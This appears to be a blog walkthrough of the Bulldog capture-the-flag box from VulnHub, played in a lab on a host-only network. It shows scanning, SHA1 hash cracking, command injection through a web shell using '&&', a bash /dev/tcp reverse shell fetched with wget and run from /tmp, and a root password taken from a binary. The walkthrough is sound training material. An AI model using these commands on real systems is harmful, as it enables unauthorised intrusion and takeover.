[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To Guides/HowTo-index.html) <br>


# CTF Writeup:
# Bulldog on VulnHub
<br>
![a0](https://i.imgur.com/NYBLh9T.jpg)
<br>
## 11 November 2017


## There are two versions of this walkthrough: This is the original, NON-INTRODUCTORY VERSION.
Find the [Introductory Version here](https://berzerk0.github.io/gitblog/How-To Guides/FirstCTF_1of2_InfoAndSetup.html)



A fun box from Vulnhub, written by Nick Frichette.
You can find it [here](https://www.vulnhub.com/entry/bulldog-1,211/) at https://www.vulnhub.com/entry/bulldog-1,211/

Here is the description by the author:


_Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)_


After their hack by the BlackHat German Shepherds, Bulldog Industries has brought us in to find the rest of the vulnerabilities. They will be happy they did!


### Introduction

I liked this box for several reasons:
* Bulldogs are the best, come on.
* The Django webserver was a nice new (to me) exploration of a webserver implementation
* It sticks to the basics while still providing an interesting challenge.
* There is an attempt to create a real-world context.


This write up assumes the reader is using Kali, but all the tools are standard (unless mentioned) in distros like BlackArch as well – except for [dirsearch](https://github.com/maurosoria/dirsearch), but you can use dirb or dirbuster as replacements if you like.
I ran it on my native Kali host machine using VirtualBox; on a host-only network.


Before beginning, I added its IP to my hosts file for convenience.


## Method

### 1. Initial Scans

* `nmap -sV -T4 bulldog.ctf -oA nmap_JustVersions_bulldog`

<br>
![A1 – initial scan](https://i.imgur.com/42GAnyW.png)
<br>

Let’s see, we have SSH on a non-standard port, and two HTTP ports using a Python-based webserver. That’s new to me.

Let’s start with HTTP, primarily out of habit.


With HTTP, I always run nikto, nmap with vulnscan and dirsearch – all at the same time. This is one of the reasons I like tabbed terminal emulators. I use terminator, which is heavy, but I run Kali natively on my desktop so it doesn’t cause too much of a problem. A lighter alternative is Sakura.


First, we run nikto, which often gives me the juiciest pieces of info.

* `nikto -h http://bulldog.ctf -output nikto_bulldog.txt`

<br>
![A2 - nikto](https://i.imgur.com/097HRmX.png)
<br>


That /dev folder might be interesting, we’ll check it first when we do our manual scan.


Next, we try dirsearch.

I keep dirsearch in my /opt directory with other Web Tools, and run it twice, with a lot of extensions. I’m trying to be more thorough, and since it is an automated tool, this seems like a good place to start.

I run it with a script that contains two scans, one with the default wordlist, and one with the medium dirbuster wordlist found (on Kali) in /usr/share/wordlists/dirbuster/


Here’s my script if you want to give it a go:
```
#!/bin/bash

#dirsearchem
#$1 box name
#$2 URL (check for Domain, HTTPS, port first)

clear
date
echo "Running dirsearch on $1 $2"

python3 /opt/Web_Tools/dirsearch/dirsearch.py -u "$2" -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar --plain-text-report=dirsearch_$1_quick

python3 /opt/Web_Tools/dirsearch/dirsearch.py -u "$2" -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --plain-text-report=dirsearch_$1_BigList

date
echo "Finished dirsearch on $1 at  $2"

```
For demo reasons, I will do these two scans separately. The second scan is often overkill.


* `python3 /opt/Web_Tools/dirsearch/dirsearch.py -u bulldog.ctf -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar --plain-text-report=dirsearch_bulldog_quick`


<br>
![A3 – quick dirsearch](https://i.imgur.com/3yy0ORU.png)
<br>


Okay, those look very interesting. We will add /admin and /robots.txt to the list, then begin the big dirsearch scan,


* `python3 /opt/Web_Tools/dirsearch/dirsearch.py -u bulldog.ctf -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt –plain-text-report=dirsearch_bulldog_bigList`


<br>
![A4 – big dirsearch](https://i.imgur.com/RhwGDpk.png)
<br>


Lastly, before browsing around using the “look at it with my eyeballs” scan, we run a full nmap scan with the vulnerability script.

* `nmap -A --script=vuln -T4 bulldog.ctf -oA nmap_FullWithVuln_bulldog`

We’ll give these scans a moment, and begin our manual scan.



## 2. Manual Website Investigation
<br>
![A6 – website landing](https://i.imgur.com/pD6Dsrs.png)
<br>


Woof. Business operations are suspended! We have to save the bulldogs! Let’s investigate this public notice.


<br>
![A7- notice](https://i.imgur.com/j2kuQNo.png)
<br>


I appreciate it when CTF authors slip a bit of humor into their machines. However, it seems to me that the only useful information is that the dirtycow exploit will probably not work on this box. ("Smelly cow?")


Let’s check on the big dirsearch list and see if caught anything new.

<br>
![A8 – big dirsearch result](https://i.imgur.com/dMSc5Iz.png)
<br>

Doesn’t look like it. /notice is new, but that’s the page we are looking at. If we get stuck later we can try dirsearching again and adding `-f` or `-r` to force extensions and search recursively.

Alright, let’s dive into the manual scan, armed with our list of /dev, /admin and /robots.txt. I like to start with robots.txt, since it might contain info that our scans couldn’t access.


![A9 – robots.txt](https://i.imgur.com/CLnMQe2.png)


Oh no! ASCII art, the mark of a true elite hacker! We will have to remember to deface… I mean, fix this later on. It doesn’t contain anything new however. Let’s check /dev.


(At this point, I checked on my `nmap` vulnscan – it had not found anything new, but it did find /robots.txt and /dev “interesting”)


<br>
![A10 - /dev page 1](https://i.imgur.com/Rl05KuU.png)
<br>

I like a CTF with an attempt to create real-world context. This is full of useful information.

* Team Lead: Alan Brooke (sounds like an admin to me)
* The previous team exploited a webserver vulnerability to gain a low-priv shell then gained root with dirtycow. (A solid strategy, which I will try to reproduce)
* “We are using some files which may be corrupted from original system...” (perhaps I can use the some of same strategies the Shepherds used)
* “We are removing PHP entirely from the new server” (Okay, no php shells)
* “...we will not be using PHPMyAdmin or any other popular CMS system...” (This means that the phpmyadmin I found may be useless. But, rolling your own CMS sounds prone to misconfigurations.)
* New website it written entirely in Django
* SSH is enabled, but a Web-Shell is also in use (this shell must be written in Django like everything else)
* MongoDB is not FULLY installed, but might be partially installed.

<br>
![A11 /dev page 2](https://i.imgur.com/tyPnf5M.png)
<br>

* “It touts being able to run every minute...” (Sounds like cronjobs to me)
* A list of usernames is presented to us.
* The bright-blue “Web-Shell” is a link that takes us to /dev/shell – but we need to log in to the website before being able to access it.



My next goal is to access that Web-Shell, and exploit it. Before I do that, I’ll need to appear like I have logged in.


## 3. Logging into the Website

Let’s check out that /admin page

<br>
![A12 – admin page](https://i.imgur.com/7uC9fyH.png)
<br>

We have a list of many usernames, so technically we can assume we are halfway to a valid set of login credentials. We have emails, but I don’t think any of them will respond to any phishing attempts.


We’ve been told that the site uses Django for everything, and this is also announced at the top of the page. This suggests SQL Injection isn’t going to be helpful here.


Hmm, we can start digging through some page sources to see if we can find something useful. I first checked /admin’s source, but didn’t find anything I new how to use at this time. There is an interesting POST data section called *“csrfmiddlewaretoken”* - which sounds like there is some kind of system in place against CSRF attacks.


/dev is directed to internal developers, so it is more likely to have informative comments.


<br>
![A13 – devsrc](https://i.imgur.com/M5EMc3Z.png)
<br>


Well, those comments have the potential to be VERY informative.
“Django's default is too complex... It's not like a hacker can do anything with a hash” - daring us to prove them wrong.


I copied the emails and hashes into the useful `email:hash` format. Before I introduce them to my friend John, let’s see what type of hash they are. Now, you can quickly do this on Kali using

* `hashid -m THE_HASH`


but I want to maybe not just identify the hash format, but crack it at the same time, if I can. Enter [HashBuster](https://github.com/UltimateHackers/Hash-Buster). From experience, I am going to guess they’re SHA1. Hash-Buster seems to only work for SHA1 and MD5 hashes, but that suits us fine.


* `python /opt/Hashing_Tools/Hash-Buster/hash.py`

<br>
![A14 – hashbuster](https://i.imgur.com/iYwqlYY.png)
<br>

Okay, we have SHA1, but it didn’t crack. Luckily, we have many hashes to choose from. We can try them all. For best results, let’s run them through John the Ripper and then check them in HashBuster while that is running.


I’m going to use my own wordlist here, my commonly used Top32Million-probable.txt that you can find in my [Probable-Wordlists Repo](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords) – this particular list can’t be downloaded from GitHub directly, but torrents and MegaUpload links are provided.


You don’t HAVE to use that wordlist, but I had more success with it than the default option. For honesty’s sake, I’ll mention that rockyou works well too.

* `john dev_hashes.txt --format=Raw-SHA1 --wordlist=~/Wordlists/Top32Million-probable.txt`

<br>
![A15 – john](https://i.imgur.com/7V9B0kI.png)
<br>


Somehow, I don’t find those results surprising. We do have two FULL login credentials now, so let’s try them.


(For completeness’ sake, I ran all of the hashes through hash-buster, and none came up ¯\\\_(ツ)\_/¯ - You can google them (and should normally, but that can lead to walkthroughs online and spoilers. Then again, here you are reading one of those – so go nuts!)



We COULD try them on the website login, where we know they will probably work, but people reuse passwords all the time. The client has not closed SSH yet, so let’s try there!


* `ssh nick@bulldog.ctf -p 23` - and his password
* `ssh sarah@bulldog.ctf -p 23` - and her password

<br>
![A16 – ssh try](https://i.imgur.com/MLIDYYe.png)
<br>

No luck, but keeping it simple can yield great results.


So, we have two usernames to choose from. Nick works on the site’s backend, and Sarah runs the database. Backend might have access to the server, but database might have access to more credentials. Both are good choices, so let’s try both!


Make sure you hit “Log Out” between attempts, or you’ll get stuck in cookie limbo. I logged in with both and got an identical not-very-promising screen for each user.


<br>
![A17 – logged in](https://i.imgur.com/tYwMZcz.png)
<br>


However, armed with a logged-in session, we can access the web-shell! Go to /dev/shell and let’s see what we can do.





## 4. Exploiting the Web-Shell
<br>
![A18 – webshell](https://i.imgur.com/8RO4ZhA.png)
<br>


*"All commands are run on the server itself"* is SCREAMING command injection.
We want to run commands here, so we have to figure out how to allow arbitrary commands through.


What do we know?


It's running Django, a python variant. It is likely to be using something analogous to *"exec"* in php, but there might be some *“if”* statement checking for the right commands. I wonder if we can trick this if statement by using one of the commands on the list, then once it passes that check, executing any command we want.


Let’s try something like `;`

* `ls; pwd;`


<br>
![A19 – they caught me!](https://i.imgur.com/O18uXlG.png)
<br>



Oh no! The internet police are coming after me!



Let’s try `&&`

<br>
![A20 – andand](https://i.imgur.com/MbiPSDA.png)
<br>

This is promising, but `pwd` is on the list of approved commands. Let’s try something unapproved, like `id`, `whoami` or `cd` .

* `pwd && id && whoami && cd /tmp && pwd`

<br>
![A21 – norules](https://i.imgur.com/mU1q3XJ.png)
<br>

Not only do we find out we can run commands, but we find out we can run `sudo`!

Let’s see if we can use this to run a reverse shell. I have had mixed success with `nc` using the `-e` flag, so my go to shell command is:


* `bash -i >& /dev/tcp/local.machine.ip.addr/PORTNUM 0>&1`


Which we need to run after `pwd` or one of the other commands – after we have set up our listener of course.

On our local machine, we run:

* `nc -lnvp 51000` - or any port number you like.

And then on the Web-Shell, try running.

* `pwd &&  bash -i >& /dev/tcp/192.168.56.1/51000 0>&1`

<br>
![A22 nobashrev](https://i.imgur.com/xHcXXR0.png)
<br>

It didn’t like that, or give us a shell – but we didn’t get a “not allowed” error. That's called progress!
My go-to method to get around this is to write a script containing the more complicated or powerful commands I want to run, then to run a command to download and execute that script using simpler commands. It usually comes in these three parts:

* Creating a script containing a reverse shell spawning command, which is, in this case, `bash -i >& /dev/tcp/192.168.56.1/51000 0>&1`
* Hosting this script in a location the machine we want the reverse shell on can download from. In this case I am running a host-only network, so I will host it on my local machine.
* Downloading the script to a writable directory, then making it executable and running it.


This last part usually uses `wget`-to donwload the script to a writable directory like /tmp and then running `chmod +x script.sh` and `bash script.sh` - so, we need do check if our user can run these commands.


In the webshell, we run

* `pwd && which wget && which chmod && which bash && cd /tmp && pwd && ls -la`

This script will tell us if we can run `wget`, `chmod` and `bash`, while also double-checking that we can write to /tmp.


<br>
![A23 – canrun](https://i.imgur.com/8bYrqBT.png)
<br>

All good news! We can run all of those commands, AND can write to /tmp – this means we are ready to set up our http server and download the script!


On our host machine, we write our shell script to a .sh file. I did this with a simple:

* `echo "bash -i >& /dev/tcp/192.168.56.1/51000 0>&1" > script.sh`

Then, we start our SimpleHTTPServer in that same directory with

* `python -m SimpleHTTPServer 51001`

<br>
![A24 host and script](https://i.imgur.com/YXKz4U7.png)
<br>

Our host machine is ready to serve up a freshly baked script. Make sure your listener is running, then we need to execute the change directory, download, make executable and run operation in the Web-Shell.


* `pwd && cd /tmp && wget http://192.168.56.1:51001/script.sh && chmod +x script.sh && bash script.sh`

Make sure your ports are right! The host port is 5100 *1* and the listener is 5100 __0__.

<br>
![A25 – shell popped!](https://i.imgur.com/2MlDwjN.png)
<br>




## 5. Enumerating With A User Shell

We have some enumeration and privesc shell scripts handy, but before we go downloading and running them, we should try some simple things.


Since this box is simulating a real world experience, we may see some common user missteps, such as leaving important notes and reminders laying around. Usually, these users would leave these things in a home folder – or maybe in emails.


Let’s see what we can see in the /home directory.


* `cd /home && ls`

We can see here that Nick and Sarah don’t have home folders on this machine, there is just bulldogadmin and django. Luckily, we ARE django.


* `ls *`  shows us the non-hiddden. contents of the directories.

Just a quick check to see if `root_password_do_not_touch.txt` is in any of these folders. Perhaps that file is hidden?


* `ls -la *`

<br>
![A26 – homeenum](https://i.imgur.com/K4eKD09.png)
<br>

`.hiddenadmindirectory` is not a standard, and we can look inside!


* `ls -a bulldogadmin/.hiddenadmindirectory`

A note? Could this be our `AdminPassNoHackersPlz.txt` file?

* `cd bulldogadmin/.hiddenadmindirectory;`
* `cat note`


<br>
![A27 – hidden admindir](https://i.imgur.com/nBgsPUX.png)
<br>

*"...the webserver is the… …one who needs to have root access..."* is all I needed to hear to get me interested. Right now, we are running as the webserver, and root access would be just lovely.


The other lines that got my attention were *"Once I’m finished with it, a hacker wouldn’t even be able to reverse it,"* and *"…it’s still a prototype right now."*

Maybe WE can reverse it.



## 6. Reversing to Root

As of this writing, I am pretty new to reverse engineering. I do know some basics in gdb and peda, but before we try those, let’s see if it is a gift to be simple.
I know that the customPermissionApp has been compiled, but there might be some useful human-readable lines in there. We can use the `strings` command here, and use `less` to go through it carefully. First, we will need a tty.

* `which python`

We’ve got python, so we can run our python tty spawning command.


* `python -c ‘import pty;pty.spawn("/bin/bash")`


Now we can use `less`   


* `strings customPermissionApp | less`

<br>
![A28 – pty and strings](https://i.imgur.com/fAawFFJ.png)
<br>

Okay, let’s see if anything jumps out at us.
<br>
![A29 – lesscustomP](https://i.imgur.com/DHi89OU.png)
<br>

The first thing I noticed was *"sudo su root"* at the bottom. This command doesn’t just run a command as root, it tries to log in as root for a time.


*"sudo su"* also requires a password, but the line *"Usage: ./customPermissionApp <username>"* doesn’t appear to even ask for one. The note did mention that it only worked for the Django user, too. Could this mean that the password for the Django user is contained within this file?


We should read the whole file to try to find something, but let’s start with the section we are already looking at.

<br>
![A30 – supergood](https://i.imgur.com/0NqcoBh.png)
<br>
Hmm, this isn’t quite readable but I can make a guess out of it.

```
SUPERultH
imatePASH
SWORDyouH
CANTget
```

You know, if you dropped those pesky H’s at the end, you would find `SUPERultimatePASSWORDyouCANTget` - which is yelling at us to be tried as a root password. So, let’s try it out.

* `sudo su`

password: `SUPERultimatePASSWORDyouCANTget`


<br>
![A31 shift+3](https://i.imgur.com/x9r9wRM.png)
<br>


I just love seeing that little #.

We own this box now – we are the top (bull)dog! From here we can just go to the /root directory and grab the flag.

* `cd /root; ls;`
* `cat congrats.txt`




## Lessons Learned
* SSH is pretty safe, especially compared to web shells that execute commands directly on the server
* Input sanitization is hard.
* You DO need to use those more complicated hashes.
* If your website is called "bulldog" - don't make that your password, ya dingus.





Thanks to Nick Frichette for a fun box!
Looking forward to the sequel!



<br>
[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To Guides/HowTo-index.html) <br>
